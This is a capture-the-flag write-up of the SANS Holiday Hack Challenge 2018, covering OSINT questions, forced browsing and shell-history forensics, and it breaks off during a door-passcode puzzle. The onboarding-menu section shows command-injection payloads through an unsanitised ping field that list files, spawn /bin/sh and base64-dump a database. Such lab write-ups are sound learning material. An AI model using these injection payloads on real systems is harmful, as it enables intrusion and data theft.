SANS Christmas Challenge 2018
=============================
:date: 2019-01-14
:author: useless
:category: Write-up
:slug: sans-christmas-challenge-2018

.. role:: underline
    :class: underline

.. image:: /images/sans-christmas-challenge-2018/sans_christmas_challenge_2018_logo.png
    :alt: sans_christmas_challenge_2018_logo.png
    :align: center

🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up
for the `2018 SANS Christmas Challenge <https://holidayhackchallenge.com/2018/story.html>`__.

.. contents:: Table of contents

Introduction
~~~~~~~~~~~~

This year, we're invited by Santa to KringleCon! It's a security conference,
with several talks by renowned security professionals. Santa organized this
conference because of the security breaches that occured during these past
Christmases. He also decided to up the physical security, as we can see toy
soldiers patrolling. They seem to obey to some guy named `Hans <https://en.wikipedia.org/wiki/List_of_Die_Hard_characters#Hans_Gruber>`__,
who is also here. Let's hope that things don't go awry this year!

.. image:: /images/sans-christmas-challenge-2018/santa.png
    :alt: santa.png
    :align: center

*Santa says*

    Welcome, my friends! Welcome to my castle! Would you come forward please?

    Welcome. It’s nice to have you here! I’m so glad you could come. This is
    going to be such an exciting day!

    I hope you enjoy it. I think you will.

    Today is the start of KringleCon, our new conference for cyber security
    practitioners and hackers around the world.

    KringleCon is designed to share tips and tricks to help leverage our skills
    to make the world a better, safer place.

    Remember to look around, enjoy some talks by world-class speakers, and
    mingle with our other guests.

    And, if you are interested in the background of this con, please check out
    Ed Skoudis’ talk called `START HERE <https://youtu.be/31JsKzsbFUo>`__.

    Delighted to meet you. Overjoyed! Enraptured! Entranced! Are we ready? Yes!
    In we go!

Here are the questions we must answer:

1. What phrase is revealed when you answer all of the `KringleCon Holiday Hack
   History questions <https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html>`__?

2. Who submitted (First Last) the rejected talk titled **Data Loss for Rainbow
   Teams: A Path in the Darkness**?

3. The KringleCon Speaker Unpreparedness room is a place for frantic speakers
   to furiously complete their presentations. The room is protected by a door
   passcode. Upon entering the correct passcode, what message is presented to
   the speaker?

4. Retrieve the encrypted ZIP file from the North Pole Git repository. What is
   the password to open this file?

5. Using the data set contained in this `SANS Slingshot Linux image
   <https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova>`__,
   find a reliable path from a Kerberoastable user to the Domain Admins group.
   What’s the user’s logon name (in username@domain.tld format)?

6. Bypass the authentication mechanism associated with the room near Pepper
   Minstix. `A sample employee badge is available
   <https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg>`__.
   What is the access control number revealed by the `door authentication
   panel <https://scanomatic.kringlecastle.com/index.html>`__?

7. Santa uses an Elf Resources website to look for talented information
   security professionals. `Gain access to the website
   <https://careers.kringlecastle.com/>`__ and fetch the document
   :code:`C:\candidate_evaluation.docx`. Which terrorist organization is
   secretly supported by the job applicant whose name begins with "K"?

8. Santa has introduced a `web-based packet capture and analysis tool
   <https://packalyzer.kringlecastle.com/>`__ to support the elves and their
   information security work. Using the system, access and decrypt HTTP/2
   network activity. What is the name of the song described in the document
   sent from Holly Evergreen to Alabaster Snowball?

9. Alabaster Snowball is in dire need of your help. Santa's file server has
   been hit with malware. Help Alabaster Snowball deal with the malware on
   Santa's server by completing several tasks. To start, assist Alabaster by
   accessing (clicking) the snort terminal below. Then create a rule that will
   catch all new infections. What is the success message displayed by the Snort
   terminal?

10. After completing the prior question, Alabaster gives you a document he
    suspects downloads the malware. What is the domain name the malware in the
    document downloads from?

11. Analyze the full malware source code to find a kill-switch and activate it
    at the North Pole's domain registrar `HoHoHo Daddy
    <https://hohohodaddy.kringlecastle.com/index.html>`__. What is the full
    sentence text that appears on the domain registration success message
    (bottom sentence)?

12. After activating the kill-switch domain in the last question, Alabaster
    gives you a `zip file <https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip>`__
    with a memory dump and encrypted password database. Use these files to
    decrypt Alabaster's password database. What is the password entered in the
    database for the Vault entry?

13. Use what you have learned from previous challenges to open the `door to
    Santa's vault <https://pianolockn.kringlecastle.com/>`__. What message do
    you get when you unlock the door?

14. Who was the mastermind behind the whole KringleCon plan?

As was done last year, we'll try not to rely on the hints given by the elves,
because it's more fun to try to find solutions in your own way. This is what
allows you to come up with creative solutions. So I'll post the solutions to
the Cranberry Pi challenges, but we won't use the hints that are given after
solving.

**Disclaimer**: I did use the hints for question 12, but not before I wasted
soooo much time exploring soooo many dead-ends. Fun!

As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).

Alright, let's get to it!

Orientation Challenge
~~~~~~~~~~~~~~~~~~~~~
Bushy Evergreen's Cranberry Pi Challenge
----------------------------------------

Bushy Evergreen seems to be having problem with exiting his text editor. Can
you guess the editor?

::

                    ........................................
                 .;oooooooooooool;,,,,,,,,:loooooooooooooll:
               .:oooooooooooooc;,,,,,,,,:ooooooooooooollooo:
             .';;;;;;;;;;;;;;,''''''''';;;;;;;;;;;;;,;ooooo:
           .''''''''''''''''''''''''''''''''''''''''';ooooo:
         ;oooooooooooool;''''''',:loooooooooooolc;',,;ooooo:
      .:oooooooooooooc;',,,,,,,:ooooooooooooolccoc,,,;ooooo:
    .cooooooooooooo:,''''''',:ooooooooooooolcloooc,,,;ooooo,
    coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;ooo,
    coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,,;l'
    coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc,,..
    coooooooooooooo,,,,,,,,,;ooooooooooooooloooooc.
    coooooooooooooo,,,,,,,,,;ooooooooooooooloooo:.
    coooooooooooooo,,,,,,,,,;ooooooooooooooloo;
    :llllllllllllll,'''''''';llllllllllllllc,

    I'm in quite a fix, I need a quick escape.
    Pepper is quite pleased, while I watch here, agape.
    Her editor's confusing, though "best" she says - she yells!
    My lesson one and your role is exit back to shellz.

    -Bushy Evergreen

    Exit vi.

We appear to be in a :code:`vi`-edited document, and we have to exit
:code:`vi`. Luckily for me, that's also my editor of choice. First, you have
to make sure that you are in command mode, by pressing :code:`Escape`. Then,
you can simply exit :code:`vi` by typing :code:`:q`, followed by :code:`Enter`.

What's more, if you press :code:`Ctrl + C` while in :code:`vi`, the following
message is displayed: :code:`Type :quit<Enter> to exit Vim`.

KringleCon Holiday Hack History questions
-----------------------------------------

We are tasked with performing a little bit of `OSINT <https://en.wikipedia.org/wiki/Open-source_intelligence>`__
in order to answer some questions, regarding the three last SANS Christmas
Challenges. Fortunately, all the answers can be found in your favorite SANS
Christmas Challenge write-ups! The correct answers are marked, and I give you
a link to my past write-ups where the answers can be found. Alternatively, you
can find the answers in `Ed Skoudis' introduction video to KringleCon <https://www.youtube.com/watch?v=31JsKzsbFUo>`__.

1. In 2015, the Dosis siblings asked for help understanding what piece of their
   "Gnome in Your Home" toy?

   a. :code:`[✓]` Firmware (answer `here </posts/2016/01/09/sans-christmas-challenge-2015/#part-2-ill-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit>`__)
   b. :code:`[ ]` Clothing
   c. :code:`[ ]` Wireless adapter
   d. :code:`[ ]` Flux capacitor

2. In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which
   corporation?

   a. :code:`[ ]` Elgnirk
   b. :code:`[✓]` ATNAS (answer `here </posts/2016/01/09/sans-christmas-challenge-2015/#part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt>`__)
   c. :code:`[ ]` GIYH
   d. :code:`[ ]` Savvy, Inc.

3. In 2016, participants were sent off on a problem-solving quest based on what
   artifact that Santa left?

   a. :code:`[ ]` Tom-tom drums
   b. :code:`[ ]` DNA on a mug of milk
   c. :code:`[ ]` Cookie crumbs
   d. :code:`[✓]` Business card (answer `here </posts/2017/01/05/sans-christmas-challenge-2016/#part-1-a-most-curious-business-card>`__)

4. In 2016, Linux terminals at the North Pole could be accessed with what kind
   of computer?

   a. :code:`[ ]` Snozberry Pi
   b. :code:`[ ]` Blueberry Pi
   c. :code:`[✓]` Cranberry Pi (answer `here </posts/2017/01/05/sans-christmas-challenge-2016/#part-3-a-fresh-baked-holiday-pi>`__)
   d. :code:`[ ]` Elderberry Pi

5. In 2017, the North Pole was being bombarded by giant objects. What were
   they?

   a. :code:`[ ]` TCP packets
   b. :code:`[✓]` Snowballs (answer `here </posts/2018/01/10/sans-christmas-challenge-2017/#introduction>`__)
   c. :code:`[ ]` Misfit toys
   d. :code:`[ ]` Candy canes

6. In 2017, Sam the snowman needed help reassembling pages torn from what?

   a. :code:`[ ]` The Bash man page
   b. :code:`[ ]` Scrooge's payroll ledger
   c. :code:`[ ]` System swap space
   d. :code:`[✓]` The Great Book (answer `here </posts/2018/01/10/sans-christmas-challenge-2017/#introduction>`__)

Answering correctly these questions gives us the hidden phrase,
:code:`Happy Trails`.

Directory Browsing
~~~~~~~~~~~~~~~~~~
Minty Candycane's Cranberry Pi Challenge
----------------------------------------

A new employee, Mr Chan, is arriving. However, in order to make his name tag,
we find his first name.

::

    We just hired this new worker,
    Californian or New Yorker?
    Think he's making some new toy bag...
    My job is to make his name tag.
    Golly gee, I'm glad that you came,
    I recall naught but his last name!
    Use our system or your own plan,
    Find the first name of our guy "Chan!"
    -Bushy Evergreen
    To solve this challenge, determine the new worker's first name and submit to runtoanswer.
    ====================================================================
    =                                                                  =
    = S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
    =                                                                  =
    ====================================================================
     Press  1 to start the onboard process.
     Press  2 to verify the system.
     Press  q to quit.
    Please make a selection: 

We get access to a simple interface. By pressing :code:`1`, we can enter a new
employee's information:

.. code-block:: text
    :hl_lines: 7 9 11 15 17 26

    Welcome to Santa's Castle!
    At Santa's Castle, our employees are our family. We care for each other,
    and support everyone in our common goals.
    Your first test at Santa's Castle is to complete the new employee onboarding paperwork.
    Don't worry, it's an easy test! Just complete the required onboarding information below.
    Enter your first name.
    : John
    Enter your last name.
    : McClane
    Enter your street address (line 1 of 2).
    : Test Street
    Enter your street address (line 2 of 2).
    : 
    Enter your city.
    : New York
    Enter your postal code.
    : 1111
    Enter your phone number.
    : 
    Enter your email address.
    : 
    Is this correct?
    John McClane
    Test Street
    New York, 1111
    y/n: y
    Save to sqlite DB using command line
    Press Enter to continue...:

Apparently, the result is saved in a SQLite database. We can try a SQL
injection, and we'll see that special characters are, indeed, not sanitized:

.. code-block:: text
    :hl_lines: 7 28

    Welcome to Santa's Castle!
    At Santa's Castle, our employees are our family. We care for each other,
    and support everyone in our common goals.
    Your first test at Santa's Castle is to complete the new employee onboarding paperwork.
    Don't worry, it's an easy test! Just complete the required onboarding information below.
    Enter your first name.
    : John'
    Enter your last name.
    :
    Enter your street address (line 1 of 2).
    :
    Enter your street address (line 2 of 2).
    : 
    Enter your city.
    :
    Enter your postal code.
    :
    Enter your phone number.
    : 
    Enter your email address.
    : 
    Is this correct?
    John'
    
    ,
    y/n: y
    Save to sqlite DB using command line
    Error: unrecognized token: "'John'','', '', '', '', '', '', '')"
    Press Enter to continue...:

So, there is indeed a SQL injection. However, it seems to be in an
:code:`INSERT`-kind of statement. While it's possible to perform SQL injection
in these statements, it's kind of a pain, because most of the time, you can't
get the result of your injection.

So, let's take a look at the other functionality of the menu:

.. code-block:: text
    :hl_lines: 1 3

    Please make a selection: 2
    Validating data store for employee onboard information.
    Enter address of server: 127.0.0.1
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.070 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.075 ms
    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.051 ms
    --- 127.0.0.1 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2039ms
    rtt min/avg/max/mdev = 0.051/0.065/0.075/0.012 ms
    onboard.db: SQLite 3.x database
    Press Enter to continue...:

So, the program seems to perform a :code:`ping` on an IP address that we give,
and then to analyze a file called :code:`onboard.db`, which seems to be our
SQLite database. Let's see if our IP address is correctly sanitized, or if we
can try some basic command injection:

.. code-block:: text
    :hl_lines: 2 12 13 14

    Validating data store for employee onboard information.
    Enter address of server: 127.0.0.1; ls -lh
    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.059 ms
    64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
    64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.064 ms

    --- 127.0.0.1 ping statistics ---
    3 packets transmitted, 3 received, 0% packet loss, time 2001ms
    rtt min/avg/max/mdev = 0.059/0.062/0.065/0.009 ms
    total 5.4M
    -rw-r--r-- 1 root root 3.8K Dec 14 16:13 menu.ps1
    -rw-rw-rw- 1 root root  24K Dec 14 16:13 onboard.db
    -rwxr-xr-x 1 root root 5.3M Dec 14 16:13 runtoanswer
    onboard.db: SQLite 3.x database

It worked! We were able to execute arbitrary commands, and list the content of
the current directory. The :code:`menu.ps1` file seems to be a PowerShell
script which displays the menu of the Cranberry Pi. The :code:`runtoanswer`
file seems to be an executable that we have to run in order to give our answer,
to wit the first name of Mr Chan. Let's take a look at :code:`menu.ps1`. We can
do this by using our arbitrary command execution to :code:`cat menu.ps1`:

.. code-block:: powershell
    :hl_lines: 99 100

    $global:firstrun = $TRUE
    function Show-Menu
    {
        $intro = @(
            "We just hired this new worker,",
            "Californian or New Yorker?",
            "Think he's making some new toy bag...",
            "My job is to make his name tag.",
            "",
            "Golly gee, I'm glad that you came,",
            "I recall naught but his last name!",
            "Use our system or your own plan,",
            "Find the first name of our guy `"Chan!`"",
            "",
            "-Bushy Evergreen",
            "",
            "To solve this challenge, determine the new worker's first name and submit to runtoansw
    er."
        )
        $header = @(
            "===================================================================="
            "=                                                                  =",
            "= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =",
            "=                                                                  =",
            "===================================================================="
        )
        cls
        if ($global:firstrun -eq $TRUE) {
            Write-Host "`n`n"
            for ($i = 0; $i -lt $intro.length; $i++) {
        Write-Host "`n`nIs this correct?`n`n"
                Write-Host $intro[$i]
            }
            $global:firstrun = $FALSE
        }

        Write-Host "`n`n`n"
        for ($i = 0; $i -lt $header.length; $i++) {
            Write-Host $header[$i]
        }
        Write-Host "`n`n`n"
        Write-Host ' Press '1' to start the onboard process.'
        Write-Host ' Press '2' to verify the system.'
        Write-Host ' Press 'q' to quit.'
        Write-Host "`n"
    }

    function Employee-Onboarding-Form
    {
        Write-Host "`n`nWelcome to Santa's Castle!`n`n"
        Write-Host "At Santa's Castle, our employees are our family. We care for each other,"
        Write-Host "and support everyone in our common goals.`n"
        Write-Host "Your first test at Santa's Castle is to complete the new employee onboarding paperwork."
        Write-Host "Don't worry, it's an easy test! Just complete the required onboarding information below.`n`n"

        $efirst = Read-Host "Enter your first name.`n"
        $elast = Read-Host "Enter your last name.`n"
        $estreet1 = Read-Host "Enter your street address (line 1 of 2).`n"
        $estreet2 = Read-Host "Enter your street address (line 2 of 2).`n"
        $ecity = Read-Host "Enter your city.`n"
        $epostalcode = Read-Host "Enter your postal code.`n"
        $ephone = Read-Host "Enter your phone number.`n"
        $eemail = Read-Host "Enter your email address.`n"

        Write-Host "`n`nIs this correct?`n`n"
        Write-Host "$efirst $elast"
        Write-Host "$estreet1"
        if ($estreet2) {
            Write-Host "$estreet2"
        }
        Write-Host "$ecity, $epostalcode"
        Write-Host "$ephone"
        Write-Host "$eemail"

        $input = Read-Host 'y/n'
        if ($input -eq 'y' -Or $input -eq 'Y') {
            Write-Host "Save to sqlite DB using command line"
            Start-Process -FilePath "./sqlite3" -ArgumentList "onboard.db `"INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (`'$efirst`',`'$elast`', `'$estreet1`', `'$estreet2`', `'$ecity`', `'$epostalcode`', `'$ephone`', `'$eemail`')`""
        }
    }

    try
    {
        do
        {
            Show-Menu
            $input = Read-Host 'Please make a selection'
            switch ($input)
            {
                '1' {
                    cls
                    Employee-Onboarding-Form
                } '2' {
                    cls
                    Write-Host "Validating data store for employee onboard information."
                    $server = Read-Host 'Enter address of server'
                    /bin/bash -c "/bin/ping -c 3 $server"
                    /bin/bash -c "/usr/bin/file onboard.db"
                } '9' {
                    /usr/bin/pwsh
                    return
                } 'q' {
                    return
                } default {
                    Write-Host "Invalid entry."
                }
            }
            pause
        }
        until ($input -eq 'q')
    } finally {
    }

It seems that our menu has an hidden function. If we input :code:`9`, we get
access to a PowerShell console. Let's do so, and use our shell to analyze the
:code:`onboard.db` file:

.. code-block:: console
    :hl_lines: 1 8 11 23

    Please make a selection: 9
    PowerShell v6.0.3
    Copyright (c) Microsoft Corporation. All rights reserved.

    https://aka.ms/pscore6-docs
    Type 'help' to get help.

    PS /home/elf> sqlite3 ./onboard.db                                                             
    SQLite version 3.11.0 2016-02-15 17:29:24
    Enter ".help" for usage hints.
    sqlite> .schema
    CREATE TABLE onboard (
        id INTEGER PRIMARY KEY,
        fname TEXT NOT NULL,
        lname TEXT NOT NULL,
        street1 TEXT,
        street2 TEXT,
        city TEXT,
        postalcode TEXT,
        phone TEXT,
        email TEXT
    );
    sqlite> select * from onboard where lname = 'Chan';
    84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com

Hello, Scott Chan! We can now use :code:`runtoanswer` to input our answer:

.. code-block:: console
    :hl_lines: 3

    PS /home/elf> ./runtoanswer                                                                    
    Loading, please wait.....
    Enter Mr. Chan's first name: Scott
                                                                                    
        .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
      'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO   Okdooooooooooooo;  
     'oooooooooooooX  ooooO  xod       xoO  xooooo  Xoooook    0    Oooooooooooooo; 
     :oooooooooooooX  ooooO  xod  0ooooooO  xooooo  Xoooox   ooooo   kooooooooooooo 
     coooooooooooooX         xod      0ooO  xooooo  XooooO  koooook   ooooooooooooo 
     coooooooooooooX  dddd0  xod  0ddddooO  xooooo  XooooO  OoooooO  kooooooooooooo 
     coooooooooooooX  ooooO  xod  KxxxxdoO  Okkkxo  XkkkkdX   xxk    oooooooooooooo 
     cooooooooooooo0  ooook  dod       kok      Oo      Xook      Kxooooooooooooooo 
     cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
     cooooooooooooooooooooooooooooooooo MY NAME IS oooooooooooooooooooooooooooooooo
     cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
     OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
     OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
     OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
     OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
     OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
     OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
     OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
     xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
     .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
      .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
        .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                    
    Congratulations!

Lucky we had this hidden functionality. But what if it wasn't there? Well, we
can still use our command injection vulnerability to drop to a shell:

.. code-block:: text
    :hl_lines: 2 7

    Validating data store for employee onboard information.
    Enter address of server: ;/bin/sh
    Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
                [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
                [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
                [-w deadline] [-W timeout] [hop1 ...] destination
    $ ls
    menu.ps1  onboard.db  runtoanswer

And what if we can't run :code:`/bin/sh`? Well, we can still recover the SQLite
database file, and analyze it offline. To do so, we can base64 encode it, which
is kind of my favorite trick:

.. code-block:: text
    :hl_lines: 2

    Validating data store for employee onboard information.
    Enter address of server: ;base64 onboard.db
    Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
                [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
                [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
                [-w deadline] [-W timeout] [hop1 ...] destination
    U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAAQAAAAYAAAAAAAAAAAAAAAEAAAAEAAAAAAAAAAAA
    AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAC4FQg0AAAABDxUADxUAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [snip]

We then copy/paste the encoded file to our computer, decode it, and interrogate
it:

.. code-block:: console

    $ base64 -d < onboard.db.b64 > onboard.db
    $ file onboard.db
    onboard.db: SQLite 3.x database, last written using SQLite version 3016002
    $ sqlite3 onboard.db
    SQLite version 3.22.0 2018-01-22 18:45:57
    Enter ".help" for usage hints.
    sqlite> select * from onboard where lname="Chan";
    84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com

Analyzing the KringleCon CFP website
------------------------------------

We're asked to find who submitted the rejected talk titled **Data Loss for
Rainbow Teams: A Path in the Darkness**, and to take a look at `KringleCon's
CFP website <https://cfp.kringlecastle.com/>`__ to find out.

The web site is simple enough, and has a link marked "CFP". When we click on
it, we're taken to the webpage https://cfp.kringlecastle.com/cfp/cfp.html,
which tells us that the CFP is closed. However, we're not at the root of the
:code:`cfp` folder. Let's forcefully browse to
https://cfp.kringlecastle.com/cfp/:

.. image:: /images/sans-christmas-challenge-2018/cfp_rejected_talks.png
    :alt: cfp_rejected_talks.png
    :align: center

We find a CSV file called :code:`rejected-talks.csv`. If we search the talk
name in it, we'll find that submitter is one `John McClane <https://en.wikipedia.org/wiki/John_McClane>`__:

.. code-block:: console

    $ curl https://cfp.kringlecastle.com/cfp/rejected-talks.csv 2> /dev/null | grep -i 'Data Loss for Rainbow Teams: A Path in the Darkness'
    qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11

de Bruijn Sequences
~~~~~~~~~~~~~~~~~~~

Tangle Coalbox's Cranberry Pi Challenge
---------------------------------------

Apparently, a girl elf has been given a love poem by a boy elf, and ER (Elf
Ressources) has been involved, because a complaint has been made. We're asked
to find the firstname of the elf who received the love poem.

.. code-block:: console

    Christmas is coming, and so it would seem,
    ER (Elf Resources) crushes elves' dreams.
    One tells me she was disturbed by a bloke.
    He tells me this must be some kind of joke.
    Please do your best to determine what's real.
    Has this jamoke, for this elf, got some feels?
    Lethal forensics ain't my cup of tea;
    If YOU can fake it, my hero you'll be.
    One more quick note that might help you complete,
    Clearing this mess up that's now at your feet.
    Certain text editors can leave some clue.
    Did our young Romeo leave one for you?
    - Tangle Coalbox, ER Investigator
      Find the first name of the elf of whom a love poem 
      was written.  Complete this challenge by submitting 
      that name to runtoanswer.
    elf@612b2a7501cc:~$

Let's see what files we can see:

.. code-block:: console

    elf@6bb580d3ee2e:~$ ls -lha
    total 5.4M
    drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .
    drwxr-xr-x 1 root root 4.0K Dec 14 16:28 ..
    -rw-r--r-- 1 elf  elf   419 Dec 14 16:13 .bash_history
    -rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
    -rw-r--r-- 1 elf  elf  3.5K Dec 14 16:28 .bashrc
    -rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
    drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .secrets
    -rw-r--r-- 1 elf  elf  5.0K Dec 14 16:13 .viminfo
    -rwxr-xr-x 1 elf  elf  5.3M Dec 14 16:13 runtoanswer
    elf@6bb580d3ee2e:~$ ls -lhaR .secrets/
    .secrets/:
    total 12K
    drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .
    drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..
    drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 her
    .secrets/her:
    total 12K
    drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .
    drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..
    -rw-r--r-- 1 elf elf 1.9K Dec 14 16:13 poem.txt
    elf@6bb580d3ee2e:~$ cat .secrets/her/poem.txt 
    Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
    Shining many a beautiful sleighbell bearing cheer and sound so pure--
      There he cleaned them, nearly napping, suddenly there came a tapping,
    As of someone gently rapping, rapping at the sleigh house door.
    "'Tis some caroler," he muttered, "tapping at my sleigh house door--
      Only this and nothing more."
    Then, continued with more vigor, came the sound he didn't figure,
    Could belong to one so lovely, walking 'bout the North Pole grounds.
      But the truth is, she WAS knocking, 'cause with him she would be talking,
    Off with fingers interlocking, strolling out with love newfound?
    Gazing into eyes so deeply, caring not who sees their rounds.
      Oh, 'twould make his heart resound!
    Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
    Floating over, more than walking, moving toward the sound still knocking,
      Pausing at the elf-length mirror, checked himself to study clearer,
    Fixing hair and looking nearer, what a hunky elf - not shocking!
    Peering through the peephole smiling, reaching forward and unlocking:
      NEVERMORE in tinsel stocking!
    Greeting her with smile dashing, pearly-white incisors flashing,
    Telling jokes to keep her laughing, soaring high upon the tidings,
      Of good fortune fates had borne him.  Offered her his dexter forelimb,
    Never was his future less dim!  Should he now consider gliding--
    No - they shouldn't but consider taking flight in sleigh and riding
      Up above the Pole abiding?
    Smile, she did, when he suggested that their future surely rested,
    Up in flight above their cohort flying high like ne'er before!
      So he harnessed two young reindeer, bold and fresh and bearing no fear.
    In they jumped and seated so near, off they flew - broke through the door!
    Up and up climbed team and humor, Morcel being so adored,
      By his lovely NEVERMORE!
    -Morcel Nougat

We find the poem in the :code:`.secrets` folder. Good stuff, there, Morcel...
Anyway, I first thought that the name of the elf was Nevermore, however it was
not the case. So let's keep looking.

.. code-block:: console
    :hl_lines: 13

    elf@6bb580d3ee2e:~$ cat .bash_history 
    set -o history
    whoami
    echo "No, really...  /-:"
    mkdir -p .secrets/her/
    firefox https://www.google.com/search?q=love+poetry
    vim
    ls -lAR
    exit
    set -o history
    df -h
    who
    firefox https://www.google.com/search?q=replacing+strings+in+vim
    time vim
    ls -lAR
    exit
    set -o history
    vim
    exit
    ls -lA
    cat .bash_history
    echo "" >> .bash_history
    firefox https://www.google.com/search?q=turn+off+bash+history
    set +o history
    set +o history

Apparently, in addition to ripping off love poem from the web, Morcel searched
how to replace strings in :code:`vim`. So he must have used :code:`vim` to
write the poem. Let's take a look at the :code:`.viminfo` file:

.. code-block:: console
    :hl_lines: 11 13 20

    elf@6bb580d3ee2e:~$ cat .viminfo 
    # This viminfo file was generated by Vim 8.0.
    # You may edit it if you're careful!
    # Viminfo version
    |1,4
    # Value of 'encoding' when this file was written
    *encoding=latin1
    # hlsearch on (H) or off (h):
    ~h
    # Last Substitute Search Pattern:
    ~MSle0~&Elinore
    # Last Substitute String:
    $NEVERMORE
    # Command Line History (newest to oldest):
    :q
    |2,0,1546268730,,"q"
    :wq
    |2,0,1536607231,,"wq"
    :%s/Elinore/NEVERMORE/g
    |2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
    [snip]

So, the name of the elf who received the poem seems to be Elinore.

KringleCon Speaker Unpreparedness room
--------------------------------------

We're in front of the unprepared speaker room, but there's a code to enter, by
pressing four different symbols, △□○☆:

.. image:: /images/sans-christmas-challenge-2018/door_code_intro.png
    :alt: door_code_intro.png
    :align: center

Yannick's (dirty) solution
..........................

By pressing four of the buttons randomly, we get an error message:

.. image:: /images/sans-christmas-challenge-2018/door_code_first_incorrect_guess.png
    :alt: door_code_first_incorrect_guess.png
    :align: center

If we take a look at the network requests that were made, we can see that a
:code:`GET` request was made to the https://doorpasscoden.kringlecastle.com/checkpass.php?i=0003&resourceId=undefined
URL.

The :code:`i` variable seems to be holding our passcode. If we click another
button, another request is directly made to https://doorpasscoden.kringlecastle.com/checkpass.php?i=0031&resourceId=undefined

.. image:: /images/sans-christmas-challenge-2018/door_code_second_incorrect_guess.png
    :alt: door_code_second_incorrect_guess.png
    :align: center

We can see that our :code:`i` variable went from :code:`0003` to :code:`0031`.
From this, we can see that:

* △ = 0
* □ = 1
* ○ = 2
* ☆ = 3

